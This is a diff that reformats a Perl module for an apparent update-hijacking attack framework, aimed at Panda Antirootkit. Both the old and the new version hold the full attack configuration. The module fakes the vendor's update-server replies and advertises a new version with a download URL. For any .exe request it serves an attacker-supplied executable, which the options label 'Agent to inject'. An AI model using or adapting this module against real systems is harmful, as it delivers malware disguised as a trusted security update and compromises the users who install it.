@@ -27,50 +27,51 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Panda Antirootkit',
-    'version' => '1.0',
-    'appver'  => '',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => '(acs.pandasoftware.com|suspects.pandasoftware.com)',
-    'request' => [
-		    {
-		    'req' => '/upglitenv/tucan/Upgrade.phtml', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => 'lastversion=5.0.0.20\nurl=http://acs.pandasoftware.com/upglite/tucan/PAVARK.exe\nlicense=5.0.0.0',
-		    'parse' => 0,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '/rootkits/sendfile.aspx', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => 'foo',
-		    'parse' => 0,
-		    'file' => '',
-		    },		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'Panda Antirootkit',
+    'version'     => '1.0',
+    'appver'      => '',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => '(acs.pandasoftware.com|suspects.pandasoftware.com)',
+    'request'     => [
+        {   'req' => '/upglitenv/tucan/Upgrade.phtml',    #regex friendly
+            'type'   => 'string',    #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 0,
+            'string' =>
+                'lastversion=5.0.0.20\nurl=http://acs.pandasoftware.com/upglite/tucan/PAVARK.exe\nlicense=5.0.0.0',
+            'parse' => 0,
+            'file'  => '',
+        },
+        {   'req'    => '/rootkits/sendfile.aspx',  #regex friendly
+            'type'   => 'string',                   #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 0,
+            'string' => 'foo',
+            'parse'  => 0,
+            'file'   => '',
+        },
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+    }
 };
 
 ##########################################################################
@@ -83,5 +84,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
